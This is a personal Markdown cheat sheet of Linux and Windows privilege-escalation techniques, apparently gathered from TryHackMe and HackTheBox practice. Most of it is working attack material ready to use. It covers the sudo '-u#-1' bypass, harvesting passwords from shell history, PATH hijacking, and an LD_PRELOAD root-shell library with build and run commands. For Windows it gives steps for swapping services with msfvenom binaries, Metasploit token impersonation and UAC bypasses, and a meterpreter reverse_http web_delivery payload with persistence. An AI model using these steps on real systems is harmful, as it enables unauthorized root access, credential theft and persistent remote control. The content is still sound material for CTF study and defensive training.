# Privesc (not including gtfobins stuff)

A quick cheat sheet on privesc I have found while playing thm/htb etc.

## Sudo version 1.8.27 

```sudo -u#-1 /bin/bash```

## Check History

Check if user typed passwords etc to terminal
```cat ~/.*history | less ```


## lxd (group)

Upload alpine image and script. Run the script to get root.

## Path hijacking

```
cd /tmp <any writable directory>

echo '/bin/bash' > <command with sudo priv>
set PATH=/tmp:PATH

run command
```

## symbolic links

```ln -sf``` links a script that runs with root permissions to our script.

## Cronjobs

Either replce script if can, symbolically link etc.

## LD_PRELOAD

Compile 

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
   unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
   system("/bin/bash -p");
}
```

with

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

run

```
sudo LD_PRELOAD=/home/rober/shell.so <command that can be ran as root>
```

## Polkit

Run polkit.py and leave.

## Basic Windows

### Replace running Services

Find service that is running as nt/system and replace with msfvenom binary to gain a priv shell.

example message.exe is a windows bin running with root permission. shell.exe is a msfvenom binary. 

```
mv Message.exe Message.bak
mv shell.exe Message.exe
bg
run multi/handler again
```

or stopping a service replacing with msfvenom binary and restarting the service (remember windows checks file paths for service in a set order)

```
Stop-Service AdvancedSystemCareService9
Copy-Item -Path 'C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ven.exe' -Destination 'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe'
Start-Service AdvancedSystemCareService9
```

### Impersonating

Common to impersonate
```
    - SeImpersonatePrivilege
    - SeAssignPrimaryPrivilege
    - SeTcbPrivilege
    - SeBackupPrivilege
    - SeRestorePrivilege
    - SeCreateTokenPrivilege
    - SeLoadDriverPrivilege
    - SeTakeOwnershipPrivilege
    - SeDebugPrivilege
```

In msf
```
load incognito
list_tokens -g 
impersonate_token <token name>
```

### Metepreter system

```get system```

or if UAC enabled

```use windows/local/bypassuac```


### UAC abuse

1) find a program that can trigger the UAC prompt screen
2) select "Show more details"
3) select "Show information about the publisher's certificate"
4) click on the "Issued by" URL link it will prompt a browser interface.
5) wait for the site to be fully loaded & select "save as" to prompt a explorer window for "save as".
6) on the explorer window address path, enter the cmd.exe full path: C:\WINDOWS\system32\cmd.exe
7) now you'll have an escalated privileges command prompt. 
8) Open metaspoit
9) Run multi/script/web_delivery
10) Set target to PSH
11) Set set payload windows/meterpreter/reverse_http
12) run -j
13) Copy command into cmd shell.
14) bg
15) run windows/local/persistence for persistence

